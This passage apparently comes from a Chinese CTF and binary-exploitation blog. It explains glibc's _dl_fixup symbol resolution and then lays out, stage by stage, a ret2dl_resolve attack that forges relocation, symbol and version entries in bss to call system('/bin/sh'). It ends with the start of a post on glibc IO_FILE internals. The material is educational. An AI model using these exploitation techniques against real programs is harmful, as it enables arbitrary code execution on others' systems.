; DT_STRTAB</span><br><span class="line">LOAD:0804980C                 Elf32_Dyn &lt;6, &lt;80481ACh&gt;&gt; ; DT_SYMTAB</span><br><span class="line">LOAD:08049814                 Elf32_Dyn &lt;0Ah, &lt;6Bh&gt;&gt;  ; DT_STRSZ</span><br><span class="line">LOAD:0804981C                 Elf32_Dyn &lt;0Bh, &lt;10h&gt;&gt;  ; DT_SYMENT</span><br><span class="line">LOAD:08049824                 Elf32_Dyn &lt;15h, &lt;0&gt;&gt;    ; DT_DEBUG</span><br><span class="line">LOAD:0804982C                 Elf32_Dyn &lt;3, &lt;80498B8h&gt;&gt; ; DT_PLTGOT</span><br><span class="line">LOAD:08049834                 Elf32_Dyn &lt;2, &lt;28h&gt;&gt;    ; DT_PLTRELSZ</span><br><span class="line">LOAD:0804983C                 Elf32_Dyn &lt;14h, &lt;11h&gt;&gt;  ; DT_PLTREL</span><br><span class="line">LOAD:08049844                 Elf32_Dyn &lt;17h, &lt;8048304h&gt;&gt; ; DT_JMPREL</span><br><span class="line">LOAD:0804984C                 Elf32_Dyn &lt;11h, &lt;80482ECh&gt;&gt; ; DT_REL</span><br><span class="line">LOAD:08049854                 Elf32_Dyn &lt;12h, &lt;18h&gt;&gt;  ; DT_RELSZ</span><br><span class="line">LOAD:0804985C                 Elf32_Dyn &lt;13h, &lt;8&gt;&gt;    ; DT_RELENT</span><br><span class="line">LOAD:08049864                 Elf32_Dyn &lt;6FFFFFFEh, &lt;80482CCh&gt;&gt; ; DT_VERNEED</span><br><span class="line">LOAD:0804986C                 Elf32_Dyn &lt;6FFFFFFFh, &lt;1&gt;&gt; ; DT_VERNEEDNUM</span><br><span class="line">LOAD:08049874                 Elf32_Dyn &lt;6FFFFFF0h, &lt;80482B8h&gt;&gt; ; DT_VERSYM</span><br><span class="line">LOAD:0804987C                 Elf32_Dyn &lt;0&gt;           ; DT_NULL</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ptype Elf32_Dyn</span><br><span class="line">type = <span class="keyword">struct</span> &#123;</span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="2-由dynamic节找其他各节"><a href="#2-由dynamic节找其他各节" class="headerlink" title="2.由dynamic节找其他各节"></a>2.由dynamic节找其他各节</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">symtab 	= (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">strtab 	= (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);	</span><br><span class="line">pltgot 	= (<span class="type">uintptr_t</span>) D_PTR (l, l_info[DT_PLTGOT]);		<span class="comment">//实际上_dl_fixup中没有用到</span></span><br><span class="line">reloc 	= (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset (pltgot, reloc_arg));</span><br></pre></td></tr></table></figure>

<p>这里有四个节,实际上每个节都是表</p>
<table>
<thead>
<tr>
<th>表名</th>
<th>元素类型</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>symtab符号表</td>
<td>struct Elf32_Sym</td>
<td>保存符号名在strtab中的偏移,<br />保存符号在模块中的相对地址<br />…</td>
</tr>
<tr>
<td>strtab字符串表</td>
<td>char</td>
<td>保存本模块中所有需要动态链接的符号名</td>
</tr>
<tr>
<td>pltgot过程链接表</td>
<td></td>
<td>实际上<code>_dl_fixup</code>中没有用到</td>
</tr>
<tr>
<td>jmprel重定位表</td>
<td>struct Elf32_Rel</td>
<td>保存符号的虚拟地址,<br />保存符号在符号表中的偏移</td>
</tr>
</tbody></table>
<p>symtab符号表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span><span class="comment">//符号名在strtab中的偏移</span></span><br><span class="line">  Elf32_Addr	st_value;		<span class="comment">/* Symbol value */</span>	<span class="comment">//符号在其模块中相对地址</span></span><br><span class="line">  Elf32_Word	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>jmprel重定位表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>







<h3 id="3-在本模块符号表中找到对应表项"><a href="#3-在本模块符号表中找到对应表项" class="headerlink" title="3.在本模块符号表中找到对应表项"></a>3.在本模块符号表中找到对应表项</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reloc = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset (pltgot, reloc_arg));<span class="comment">//在重定位表中的表项</span></span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];	<span class="comment">//在符号表中的表项</span></span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *refsym = sym;	<span class="comment">//副本</span></span><br><span class="line"><span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);	<span class="comment">//GOT表项地址,为后来回填做准备</span></span><br></pre></td></tr></table></figure>





<p>下面到4之前是一些检查,忽略</p>
<h3 id="4-解析符号"><a href="#4-解析符号" class="headerlink" title="4.解析符号"></a>4.解析符号</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> 	<span class="class"><span class="keyword">struct</span> <span class="title">link_map</span>* <span class="title">result</span>;</span></span><br><span class="line"> 	Elf32_Addr value;</span><br><span class="line"></span><br><span class="line">result = _dl_lookup_symbol_x (</span><br><span class="line">         strtab + sym-&gt;st_name, 		<span class="comment">//符号名字符串</span></span><br><span class="line">         l, 							<span class="comment">//本模块的link_map</span></span><br><span class="line">         &amp;sym, 						<span class="comment">//返回值,如果在其他模块找到该符号则返回其符号表项</span></span><br><span class="line">         l-&gt;l_scope,</span><br><span class="line">         version, </span><br><span class="line">         ELF_RTYPE_CLASS_PLT, </span><br><span class="line">         flags, </span><br><span class="line">         <span class="literal">NULL</span></span><br><span class="line">     );<span class="comment">//返回值result是找到符号实现所在模块的link_map</span></span><br><span class="line"></span><br><span class="line">     value = DL_FIXUP_MAKE_VALUE (</span><br><span class="line">         result,</span><br><span class="line">         SYMBOL_ADDRESS (result, sym, <span class="literal">false</span>)<span class="comment">//从link_map *result中提取目标模块基地址,加上sym.st_value偏移量得到符号虚拟地址</span></span><br><span class="line">     );</span><br></pre></td></tr></table></figure>





<h3 id="5-回填GOT表项"><a href="#5-回填GOT表项" class="headerlink" title="5.回填GOT表项"></a>5.回填GOT表项</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);</span><br></pre></td></tr></table></figure>

<p>这里有一个压行,干了两个事情,</p>
<p>一是调用elf_machine_fixup_plt把value回写到rel_addr上</p>
<p>二是把value值,也就是已经解析出来的符号地址,放到eax寄存器上返回</p>
<p>注意此时是在dl_fixup中返回到dl_runtime_resolve中</p>
<p>下面的指令是这样的:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">call _dl_fixup		# Call resolver.</span><br><span class="line">popl %edx		# Get <span class="keyword">register</span> content back.</span><br><span class="line">movl (%esp), %ecx</span><br><span class="line">movl %eax, (%esp)	# Store the function address.</span><br><span class="line">movl <span class="number">4</span>(%esp), %eax</span><br><span class="line">ret $<span class="number">12</span>			# Jump to function address.</span><br></pre></td></tr></table></figure>

<p>注意到dl_runtime_resolve返回之前,栈顶是刚刚放入的eax,也就是刚解析出来的符号值</p>
<p>也就是直接 ret2目标函数 了</p>
<h2 id="ret2dl-resolve-1"><a href="#ret2dl-resolve-1" class="headerlink" title="ret2dl_resolve"></a>ret2dl_resolve</h2><p>能不能进行这种利用,得看RELRO✌的脸色</p>
<p>RELRO保护:</p>
<p>read only relocation,只读重定位</p>
<p>鉴于攻击者可以篡改GOT表,填充危险函数,因此如果GOT表是只读的,攻击者就没法写了</p>
<p>RELRO的目的是保护函数指针,防止篡改</p>
<table>
<thead>
<tr>
<th>保护程度</th>
<th>效果</th>
<th></th>
<th>编译选项</th>
</tr>
</thead>
<tbody><tr>
<td>NO_RELRO</td>
<td>dynamic段可写<br />GOT表可写,允许延迟绑定</td>
<td></td>
<td>-z norelro</td>
</tr>
<tr>
<td>PARTIAL_RELRO</td>
<td>dynamic段只读,<br />但是GOT表还是可写的,允许延迟绑定</td>
<td></td>
<td>-z lazy</td>
</tr>
<tr>
<td>FULL_RELRO</td>
<td>dynamic段只读<br />GOT表只读,不允许延迟绑定,所有符号必须在加载程序时立刻解析</td>
<td></td>
<td>-z now</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>回顾<code>_dl_fixup</code>函数解析符号的过程</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240819193758449.png" alt="image-20240819193758449"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Algorithm _dl_fixup</span><br><span class="line">Input:	a Link_Map linkmap of the Main module, an index reloc_arg of the jmprel table </span><br><span class="line">Output:	virtual address of the target symbol</span><br><span class="line"></span><br><span class="line">dynamic = linkmap.l_info</span><br><span class="line">jmprel = dynamic[DT_JMPREL]</span><br><span class="line">strtab = dynamic[DT_STRTAB]</span><br><span class="line">symtab = dynamic[DT_SYMTAB]</span><br><span class="line"></span><br><span class="line">reloc = jmprel[reloc_arg]</span><br><span class="line">sym = symtab[reloc.r_info]</span><br><span class="line">str = strtab[sym.st_name]</span><br><span class="line"></span><br><span class="line"><span class="comment">//other_linkmap是其他模块的Link_Map结构</span></span><br><span class="line"><span class="comment">//_dl_lookup_symbol_x(str)从其他模块中寻找str符号,如果找到则返回该符号与其所在的link_map</span></span><br><span class="line">[sym,other_linkmap] = _dl_lookup_symbol_x(str)</span><br><span class="line"></span><br><span class="line"><span class="comment">//link_map中保存着目标模块的基地址,sym中保存着符号相对目标模块的偏移量,加起来得到符号的虚拟地址</span></span><br><span class="line">vaddr = other_linkmap.laddr + sym.st_info</span><br></pre></td></tr></table></figure>



<h3 id="no-relro"><a href="#no-relro" class="headerlink" title="no_relro"></a>no_relro</h3><p>strtab节通常和text节加载到同一个只读段,因此在strtab上篡改函数名字符串是不可能的</p>
<p>在no_relro保护下,dynamic节可写, 可以篡改dynamic.strtab指针指向fake strtab</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240819193931068.png" alt="image-20240819193931068"></p>
<h3 id="partial-relro"><a href="#partial-relro" class="headerlink" title="partial_relro"></a>partial_relro</h3><p>在no_relro保护中，可以通过篡改dynamic节中的指针指向假的strtab伪造假的函数名</p>
<p>但是partial_relro保护使得dynamic节只读，无法篡改其中的字符串表指针</p>
<h4 id="stage1"><a href="#stage1" class="headerlink" title="stage1"></a>stage1</h4><p>由于我们需要构造“&#x2F;bin&#x2F;sh”这种字符串,要么调用read函数往内存里写,要么溢出时写进去</p>
<p>前者需要再构造read调用的rop链,并且还得给字符串找地方,找一个我们知道地址并且可写的地方,比如bss段</p>
<p>后者由于栈地址不知道在哪,需要做一个栈迁移,首先把栈搬到bss段上</p>
<p>后者更加方便,采取后者</p>
<h4 id="stage2"><a href="#stage2" class="headerlink" title="stage2"></a>stage2</h4><p>在本阶段我们构造rop链条,手动调用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dl_runtime_resolve@.GOT.PLT[0](</span><br><span class="line">	link_map=.GOT.PLT[1]</span><br><span class="line">	reloc_arg=0x20</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p><strong>也就是再解析调用一下write函数,目的是验证一下,已经解析过的符号,使用rop方法能够再次触发解析过程,并且该过程是正确的</strong></p>
<h4 id="stage3"><a href="#stage3" class="headerlink" title="stage3"></a>stage3</h4><p>在本阶段我们在bss段伪造一个重定位表项, 但是该表项的内容指向正确的symtab表</p>
<p>为了使用这个假重定位表项,我们将dl_runtime_resolve的参数reloc_arg改成,该bss段假表项与真的重定位表的偏移量</p>
<p>该偏移量显然会大的离谱,远远超出重定位表的范围,因为bss和relplt段相距甚远</p>
<p><strong>此举目的是验证即使传递的reloc_arg超过重定位表范围,也没有任何安全检查阻拦,使得我们能够正确解析到符号</strong></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240819195308717.png" alt="image-20240819195308717"></p>
<h4 id="stage4"><a href="#stage4" class="headerlink" title="stage4"></a>stage4</h4><p>在本阶段我们既要构造假的重定位表项,又要构造假的符号表项</p>
<p>此时假重定位表项不再指向正确的符号,而是指向我们构造的符号</p>
<p>但是这个假符号依然索引正确的符号名称</p>
<p>显然此时reloc_arg索引重定位表的偏移量远超重定位表范围,并且假重定位项索引假符号的偏移量也远超了符号表范围</p>
<p><strong>此举目的是验证,即使符号表的索引越界,也没有任何安全检查阻拦,使得我们能够正确解析到符号</strong></p>
<p><img src="C:\Users\xidian\AppData\Roaming\Typora\typora-user-images\image-20240819193641215.png" alt="image-20240819193641215"></p>
<p>想法很好,然而在dl_runtime_resolve中,r_info不只会被用来索引符号表,还会索引versym符号版本表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)&#123;</span><br><span class="line">	  <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">	  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">	  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">	    	version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240819213749275.png" alt="image-20240819213749275"></p>
<p>我们依据假符号与符号表的偏移量,计算出r_info,这保证了假重定位项可以索引假符号</p>
<p>但是不能保证r_info索引versym表的什么地方</p>
<p>实际运行时ndx&#x3D;0x442c</p>
<p>&amp;l-&gt;l_versions&#x3D;0xf7f5a710</p>
<p>然后versions表里面一项是0x10字节</p>
<p>所以version &#x3D; &amp;l-&gt;l_versions[ndx]&#x3D;0xf7f9e9d4;</p>
<p>下一条指令就要解引用了version-&gt;hash</p>
<p>然而0xf7f9e9d4上并没有在任何一个内存映射区,是一个非法地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xf7f95000</span> <span class="number">0xf7f96000</span> rw-p     <span class="number">1000</span>  <span class="number">32000</span> /usr/lib/i386-linux-gnu/ld-linux.so<span class="number">.2</span></span><br><span class="line"><span class="number">0xffb01000</span> <span class="number">0xfff59000</span> rw-p   <span class="number">458000</span>      <span class="number">0</span> [<span class="built_in">stack</span>]</span><br></pre></td></tr></table></figure>

<p>因此对非法地址解引用就段错误了</p>
<p>怎么修复这个过程呢?</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">           version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">           <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">               version = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>

<p>假重定位项的r_info既索引假符号表项,又索引假versym表项</p>
<p>如果能控制假versym表项为空,则ndx就是0,此时l_versions[ndx]&#x3D;l_versions[0]就一定是合法的了</p>
<p>也就是说,我们可以微操控制一下r_info的值</p>
<p>如何控制呢?</p>
<p>原本r_info&#x3D;0x26807,其中的索引值是0x268</p>
<p>vernum基地址是0x80482d8</p>
<p>vernum[ELFW(R_SYM)(reloc-&gt;r_info)]这个假表项,在0x80482d8+0x268*2&#x3D;0x080487A8上,使用ida观察这里是.eh_frame段</p>
<p>往下翻找一个全零的假表项位置比如0x080487C2就很好</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.eh_frame:080487A8 2C                                            db  2Ch ; ,</span><br><span class="line">	...</span><br><span class="line">.eh_frame:080487C2 00                                            db    0</span><br><span class="line">.eh_frame:080487C3 00                                            db    0</span><br></pre></td></tr></table></figure>

<p>0x080487C2&#x3D;0x80482d8+index*2</p>
<p>那么index&#x3D;0x275</p>
<p>那么r_info就得是0x27507</p>
<p>注意如果只修改假的重定位项,令其r_info&#x3D;0x27507,这样就又不能正确索引到假的符号表项了</p>
<p>按下葫芦浮起瓢,因此还需要修正bss段伪造的假符号位置,在原位置基础上加一个<code>(0x275-0x268)*16</code>即可</p>
<p>乘16的原因是,符号表项一个占用16字节</p>
<h4 id="stage5"><a href="#stage5" class="headerlink" title="stage5"></a>stage5</h4><p>在本阶段,伪造假符号名字符串,并令假符号的st_name指向它,目的是证明即使st_name远超strtab范围,依然没有任何安全检查阻拦</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240820103319870.png" alt="image-20240820103319870"></p>
<h4 id="stage6"><a href="#stage6" class="headerlink" title="stage6"></a>stage6</h4><p>把stage5中的假符号名字符串改成“system”,并把write的参数(1,“&#x2F;bin&#x2F;sh”,“7”)改成system的参数(“&#x2F;bin&#x2F;sh”)</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240820111602402.png" alt="image-20240820111602402"></p>
<h2 id="在目标模块中阴暗地爬行"><a href="#在目标模块中阴暗地爬行" class="headerlink" title="在目标模块中阴暗地爬行"></a>在目标模块中阴暗地爬行</h2><p>分析了<code>_dl_fixup</code>的源码之后,已经能够理解ret2dl-resolve的原理了</p>
<p>下面的问题是,<code>_dl_fixup</code>中调用的<code>_dl_lookup_symbol_x</code>函数,是如何查找符号的呢?</p>
<p>可想而知的是,<code>glibc</code>中的符号成百上千,如果纯纯使用符号名字符串,进行模式匹配,那可真是慢了去了</p>
<p>到底怎么在目标模块中解析符号的呢?</p>
<p><a target="_blank" rel="noopener" href="https://blogs.oracle.com/solaris/post/gnu-hash-elf-sections">GNU Hash ELF Sections (oracle.com)</a></p>
<p>[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-223668.htm">翻译]GNU Hash ELF Sections-外文翻译-看雪-安全社区|安全招聘|kanxue.com</a></p>
<h2 id="符号解析中的哈希算法"><a href="#符号解析中的哈希算法" class="headerlink" title="符号解析中的哈希算法"></a>符号解析中的哈希算法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dl_runtime_resolve</span><br><span class="line">	_dl_fixup</span><br><span class="line">		_dl_lookup_symbol_x</span><br><span class="line">			do_lookup_x</span><br><span class="line">				do_lookup_unique</span><br><span class="line">					enter_unique_sym</span><br></pre></td></tr></table></figure>












































































      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/10/17/IO%20FILE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/10/17/IO%20FILE/" class="post-title-link" itemprop="url">IO_FILE</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-10-17 23:10:00" itemprop="dateCreated datePublished" datetime="2024-10-17T23:10:00+08:00">2024-10-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-10-19 23:38:59" itemprop="dateModified" datetime="2024-10-19T23:38:59+08:00">2024-10-19</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="IO FILE"></a>IO FILE</h1><p>FILE,fopen,fread等函数是glibc为c读写文件准备的数据结构和函数</p>
<blockquote>
<p>linux操作系统也提供了<code>open</code>,<code>read</code>等一系列文件操作函数</p>
<p>两者的区别是,linux这一套系统调用基于文件描述符<code>fd</code>,</p>
<p>但是glibc文件io这一套基于文件指针<code>_IO_FILE*</code>,指向一个<code>FILE</code>对象,这个对象中包装着文件描述符<code>fd</code></p>
</blockquote>
<h2 id="datastructure"><a href="#datastructure" class="headerlink" title="datastructure"></a>datastructure</h2><p>FILE相关的声明在</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">glibc2.27/libio/libioP.h</span><br><span class="line">glibc2.27/libio/bits/libio.h</span><br></pre></td></tr></table></figure>

<p><code>FILE</code>实际上是<code>_IO_FILE</code>的别名,</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ptype/ox <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">/* <span class="title">offset</span>      |    <span class="title">size</span> */  <span class="title">type</span> =</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line"><span class="comment">/* 0x0000      |  0x0004 */</span>    <span class="type">int</span> _flags;</span><br><span class="line"><span class="comment">/* XXX  4-byte hole      */</span></span><br><span class="line"><span class="comment">/* 0x0008      |  0x0008 */</span>    <span class="type">char</span> *_IO_read_ptr;</span><br><span class="line"><span class="comment">/* 0x0010      |  0x0008 */</span>    <span class="type">char</span> *_IO_read_end;</span><br><span class="line"><span class="comment">/* 0x0018      |  0x0008 */</span>    <span class="type">char</span> *_IO_read_base;</span><br><span class="line"><span class="comment">/* 0x0020      |  0x0008 */</span>    <span class="type">char</span> *_IO_write_base;</span><br><span class="line"><span class="comment">/* 0x0028      |  0x0008 */</span>    <span class="type">char</span> *_IO_write_ptr;</span><br><span class="line"><span class="comment">/* 0x0030      |  0x0008 */</span>    <span class="type">char</span> *_IO_write_end;</span><br><span class="line"><span class="comment">/* 0x0038      |  0x0008 */</span>    <span class="type">char</span> *_IO_buf_base;</span><br><span class="line"><span class="comment">/* 0x0040      |  0x0008 */</span>    <span class="type">char</span> *_IO_buf_end;</span><br><span class="line"><span class="comment">/* 0x0048      |  0x0008 */</span>    <span class="type">char</span> *_IO_save_base;</span><br><span class="line"><span class="comment">/* 0x0050      |  0x0008 */</span>    <span class="type">char</span> *_IO_backup_base;</span><br><span class="line"><span class="comment">/* 0x0058      |  0x0008 */</span>    <span class="type">char</span> *_IO_save_end;</span><br><span class="line"><span class="comment">/* 0x0060      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"><span class="comment">/* 0x0068      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"><span class="comment">/* 0x0070      |  0x0004 */</span>    <span class="type">int</span> _fileno;</span><br><span class="line"><span class="comment">/* 0x0074      |  0x0004 */</span>    <span class="type">int</span> _flags2;</span><br><span class="line"><span class="comment">/* 0x0078      |  0x0008 */</span>    <span class="type">__off_t</span> _old_offset;</span><br><span class="line"><span class="comment">/* 0x0080      |  0x0002 */</span>    <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line"><span class="comment">/* 0x0082      |  0x0001 */</span>    <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line"><span class="comment">/* 0x0083      |  0x0001 */</span>    <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"><span class="comment">/* XXX  4-byte hole      */</span></span><br><span class="line"><span class="comment">/* 0x0088      |  0x0008 */</span>    _IO_lock_t *_lock;</span><br><span class="line"><span class="comment">/* 0x0090      |  0x0008 */</span>    <span class="type">__off64_t</span> _offset;</span><br><span class="line"><span class="comment">/* 0x0098      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line"><span class="comment">/* 0x00a0      |  0x0008 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line"><span class="comment">/* 0x00a8      |  0x0008 */</span>    <span 